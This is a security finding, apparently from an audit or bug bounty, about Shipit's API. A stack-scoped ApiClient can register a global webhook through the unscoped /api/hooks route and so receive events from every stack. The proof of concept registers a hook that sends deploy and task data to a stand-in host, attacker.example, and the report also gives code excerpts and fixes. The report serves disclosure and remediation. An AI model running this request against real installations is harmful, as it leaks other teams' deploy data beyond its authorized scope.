### Title
Stack-scoped `ApiClient` can register a global webhook, escalating its authorized scope from one stack to all stacks - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::ApiClient` supports two independent restriction mechanisms: a `permissions` array (e.g. `write:hook`) and an optional `stack_id` that is supposed to confine the client to a single stack. `Api::BaseController#stacks`/`#stack` correctly narrow stack-scoped resources when a `stack_id` route param is present, but the top-level, non-stack-scoped hooks route lets a stack-restricted client register a hook with `stack_id: nil`, i.e. a **global** hook that receives events for every stack in the installation, not just the one it was authorized for.

### Finding Description
`config/routes.rb` exposes two ways to reach `Shipit::Api::HooksController`: a nested route under a specific stack, and a top-level route with no stack scoping: [1](#0-0) 

`Api::BaseController#stack`/`#stacks` restrict a stack-scoped `ApiClient` (one with `stack_id` set) to `Stack.where(id: current_api_client.stack_id)` only when a `stack_id` is present in the request: [2](#0-1) 

`HooksController`, however, only checks the client's `permissions` (`write:hook`) via `require_permission`, and computes the hook's `stack_id` purely from whether `params[:stack_id]` is present on the request — it never verifies that value against the API client's own `stack_id` restriction: [3](#0-2) 

Because the top-level `/api/hooks` route has no `stack_id` segment, `params[:stack_id]` is always absent there, so `hooks_controller#stack_id` always returns `nil`, and `hooks.create(params)` always creates a **global** hook (`Hook.where(stack_id: nil)`), regardless of whether the authenticated `ApiClient` is scoped to a single stack via `ApiClient#stack_id`.

`Hook` global hooks are delivered for every stack's events, per the delivery scope: [4](#0-3) 

This breaks the intended equality **"a stack a token authorises == a stack it touches."** Before the attacker's request, a stack-scoped `ApiClient` (e.g. fixture `here_come_the_walrus`, `stack: shipit`) is documented/expected to only read/write resources belonging to its own stack: [5](#0-4) 

After the attacker's request (`POST /api/hooks` with `write:hook` permission, no `stack_id` in path), the same credential causes a `Hook` record with `stack_id: nil` to be created, which will receive `task`, `deploy`, `rollback`, `commit_status`, `merge_status`, `pull_request`, and `stack` events for **every** stack on the installation — stacks the token was never authorized to touch.

### Impact Explanation
This is a scope-escalation / cross-stack information-disclosure bug: a credential meant to be confined to one stack can, by pointing its webhook delivery URL at attacker infrastructure, obtain an unauthenticated read of task streams, deploy output, and commit/merge status for every other stack managed by the Shipit instance (`Hook::EVENTS` includes `task`, `deploy`, `rollback`, `commit_status`, `deployable_status`, `merge_status`, `merge`, `pull_request`). This matches the "High" impact bucket: unauthenticated read of stack state, task streams, or deploy output.

### Likelihood Explanation
Requires possession of a valid `ApiClient` token that has been granted `write:hook` and is scoped to a single stack via `stack_id` — this is an intentionally low-privilege, single-stack credential (e.g. issued to a per-team integration), not an admin/global token. Exploitation is a single unauthenticated-in-scope API call (`POST /api/hooks`) with no other special conditions, making it straightforward once such a token is held.

### Recommendation
Short term: in `Api::HooksController` (and any other controller reachable via both stack-scoped and non-scoped routes), reject requests to the non-scoped `/api/hooks` collection when `current_api_client.stack_id?` is true, or force `stack_id` to `current_api_client.stack_id` rather than trusting `params[:stack_id]`'s mere presence/absence. More generally, `Api::BaseController` should centrally enforce that a stack-scoped `ApiClient` can never create, read, or modify a resource whose `stack_id` differs from (or is nil, i.e. global) the client's own `stack_id`.

Long term: document explicitly, alongside the `permissions` list, that `ApiClient#stack_id` is meant to be an authorization boundary, and add tests/guards ensuring every controller that mixes global and stack-scoped resources enforces this boundary consistently.

### Proof of Concept
1. Create an `ApiClient` scoped to a single stack with the `write:hook` permission (e.g. modeled after fixture `here_come_the_walrus`, but with `write:hook` added): [6](#0-5) 
2. Authenticate as that client and call the top-level, unscoped endpoint:
   `POST /api/hooks` with `{ delivery_url: "https://attacker.example/collect", events: ["task","deploy","commit_status"] }`
3. `HooksController#create` computes `stack_id` as `nil` because `params[:stack_id]` is absent on this route, so the resulting `Hook` is global (`stack_id: nil`): [7](#0-6) 
4. Any subsequent `task`/`deploy`/`commit_status`/etc. event on **any** stack in the Shipit installation (`Hook.deliver`/`for_stack` matches `stack_id: [nil, stack_id]`) is now delivered to the attacker's URL: [8](#0-7)

```ruby
# frozen_string_literal: true

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end

      params do
        accepts :delivery_url, String
        accepts :events, Array[String]
        accepts :content_type, String
      end
      def update
        hook.update(params)
        render_resource(hook)
      end

      def destroy
        render_resource(hook.destroy)
      end

      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
    end
```

```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
